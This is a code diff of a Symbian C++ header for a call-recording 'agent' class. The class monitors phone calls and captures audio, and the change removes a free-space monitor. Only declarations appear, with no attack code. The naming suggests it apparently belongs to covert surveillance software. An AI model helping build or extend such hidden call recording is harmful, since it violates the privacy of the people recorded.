@@ -11,7 +11,6 @@
 #include "AbstractAgent.h"
 #include "AdditionalDataStructs.h"
 #include "MonitorPhoneCall.h"
-#include "MonitorFreeSpace.h"
 #include <MdaAudioInputStream.h>
 #include <mda\common\audio.h>
 #include <mmf\common\mmfutilities.h>
@@ -29,7 +28,7 @@ enum TRecordingState
  *  CAgentCallLocal
  * 
  */
-class CAgentCallLocal : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MCallMonCallBack, public MTimeOutNotifier, public MFreeSpaceCallBack
+class CAgentCallLocal : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MCallMonCallBack, public MTimeOutNotifier
 	{
 public:
 	// Constructors and destructor
@@ -76,10 +75,6 @@ private:
 	virtual void NotifyDisconnectedCallStatusL();
 	virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber);
 
-	// From MFreeSpaceCallBack
-	virtual void NotifyAboveThreshold();
-	virtual void NotifyBelowThreshold();
-	
 	// From MTimeOutNotifier
 	virtual void TimerExpiredL(TAny* src);
 	    
@@ -137,8 +132,7 @@ private:
 	TVoiceAdditionalData iVoiceAdditionalData;  
 	
 	// monitor drive space:
-	CFreeSpaceMonitor*		iFreeSpaceMonitor;
-	TBool  iBelowQuota;
+	TBool  iBelowFreespaceQuota;
 	
 	// monitor call:
 	CPhoneCallMonitor*	iCallMonitor;
